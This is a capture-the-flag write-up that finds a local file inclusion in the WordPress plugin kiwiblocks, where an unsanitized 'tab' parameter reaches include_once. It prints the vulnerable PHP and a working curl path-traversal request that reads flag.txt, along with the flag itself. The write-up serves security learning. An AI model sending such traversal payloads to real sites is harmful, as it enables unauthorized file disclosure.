# A Nice Block

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 20 solves / 100 points
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

I like the new Gutemberg editor, so I just installed a plugin with beautiful blocks addons. That's a great plugin that perfectly matches my design needs, I don't think it could cause a security issue, right?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224190052.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/A-Nice-Block/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/A-Nice-Block)-[2025.02.23|16:11:08(HKT)]
└> file attachment.zip                 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/A-Nice-Block)-[2025.02.23|16:11:09(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
   creating: server-given/challenge-custom/
 extracting: server-given/challenge-custom/flag.txt  
[...]
  inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

Throughout this CTF, it's recommended that in all challenges we first look at what plugins/themes are installed. To automate this process, the challenge authors used [GNU make](https://www.gnu.org/software/make/) and [WP-CLI](https://wp-cli.org/) to set up the WordPress site. The `Makefile` located in path `server-given/docker/wordpress/toolbox/Makefile`:

```bash
    [...]
    $(WP_CLI) plugin activate kiwiblocks
```

In here, this WordPress site has installed a plugin called `kiwiblocks`, which is located in path `server-given/challenge-custom/kiwiblocks`.

To debug this plugin more effectively, I'll use a [Docker configuration from Wordfence Discord written by Ramuel](https://discord.com/channels/1197901373581303849/1199013923173712023/1199041121322537115) to debug the plugin with [Xdebug](https://xdebug.org/). 

After building and starting the Docker containers, we can `zip` the plugin and upload it to our WordPress site:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/A-Nice-Block/server-given/challenge-custom)-[2025.02.23|16:55:37(HKT)]
└> cd server-given/challenge-custom; zip -r kiwiblocks.zip kiwiblocks
  adding: kiwiblocks/ (stored 0%)
  adding: kiwiblocks/src/ (stored 0%)
  adding: kiwiblocks/src/global.js (deflated 70%)
  [...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224184255.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224184322.png)

After activating the plugin, we'll be redirected to `/wp-admin/admin.php?page=kiwiblocks`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-Alliance-CTF-S02E01/images/Pasted%20image%2020250224184429.png)

As the challenge's description says, this plugin has some blocks addons.

Now we can read this plugin's source code!

When I audit a plugin, I always find all the registered AJAX actions and REST API's routes. For instance, the following AJAX action `kiwiblocks_bordered`:

```php
class Kiwiblocks_Bordered extends Kiwiblocks_Block{
    [...]
    function __construct(){
        $this->name = 'bordered';
        [...]
        add_action( 'wp_ajax_kiwiblocks_' . $this->name, array( $this, 'ajaxRender' ));
        add_action( 'wp_ajax_nopriv_kiwiblocks_' . $this->name, array( $this, 'ajaxRender' ));
    }
}
```

However, none of those AJAX actions and API routes are useful to us.

Another method that I hunt for vulnerabilities is via the "[sources and sinks model](https://www.youtube.com/watch?v=ZaOtY4i5w_U)", where **sources are user inputs**, and **sinks are dangerous functions**.

After a few searches, we can see that one of many LFI (Local File Inclusion) sinks, **`include_once`**, is used in the following:

`wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php`:

```php
<?php
    [...]
    $tab = isset($_GET['tab']) ? $_GET['tab'] : 'general.php';
    try
    {
        @include_once __DIR__ . '/tabs/' . $tab;
    }
    catch(Throwable $e)
    {
        [...]
    }
```

As you can see, the source, **GET parameter `tab`**, is flow to the sink.

Also, there is no PHP code that **disallow us from directly accessing this PHP script** like the following:

```php
// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}
```

With that said, we found a **LFI vulnerability at path `wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php`**!

## Exploitation

Armed with the above information, we can get the flag via sending the following GET request:

```http
┌[siunam♥Mercury]-(~/ctf/Patchstack-Alliance-CTF-S02E01/A-Nice-Block)-[2025.02.24|18:58:45(HKT)]
└> curl --get http://52.77.81.199:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php --data 'tab=../../../../../../../../../../../../flag.txt' 
<h1 class="kiwi_title">Kiwiblocks</h1>

<div class="kiwi_panel">

    CTF{TABBING_THE_TAB_0z933}
</div>
```

- **Flag: `CTF{TABBING_THE_TAB_0z933}`**

## Conclusion

What we've learned:

1. Local File Inclusion (LFI)